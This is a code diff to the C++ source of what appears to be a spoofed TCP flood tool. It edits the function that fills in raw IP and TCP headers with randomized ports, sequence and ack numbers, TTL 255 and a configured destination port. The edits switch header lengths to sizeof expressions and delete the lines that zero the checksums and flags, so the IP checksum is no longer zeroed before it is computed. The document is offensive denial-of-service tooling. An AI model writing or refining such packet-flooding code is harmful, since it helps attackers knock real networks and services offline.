@@ -113,7 +113,7 @@ void Spoofed_TCP_Flood::override_headers(tcphdr *tcp, iphdr *ip){
 void Spoofed_TCP_Flood::init_headers(iphdr *ip, tcphdr *tcp, char *buf) {
     auto s_port = conf->RandomizePort ? Randomizer::randomPort() : 0;
     // IP Struct
-    ip->ihl = 5;
+    ip->ihl = sizeof(struct iphdr)/4;
     ip->version = 4;
     ip->tos = 16;
     ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(buf);
@@ -121,8 +121,6 @@ void Spoofed_TCP_Flood::init_headers(iphdr *ip, tcphdr *tcp, char *buf) {
     ip->frag_off = htons(0x0);
     ip->ttl = 255;
     ip->protocol = IPPROTO_TCP;
-    ip->check = 0;
-
     ip->check = csum((unsigned short *) buf, ip->tot_len);
 
     // TCP Struct
@@ -130,8 +128,6 @@ void Spoofed_TCP_Flood::init_headers(iphdr *ip, tcphdr *tcp, char *buf) {
     tcp->th_dport = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
     tcp->th_seq = htonl(static_cast<uint32_t>(Randomizer::randomInt(0, RAND_MAX)));
     tcp->th_ack = htonl(static_cast<uint32_t>(Randomizer::randomInt(0, RAND_MAX)));
-    tcp->th_off = 5;
+    tcp->th_off = sizeof(struct tcphdr)/4;
     tcp->th_win = htons(5840);
-    tcp->th_sum = 0;
-    tcp->th_flags = 0;
 }
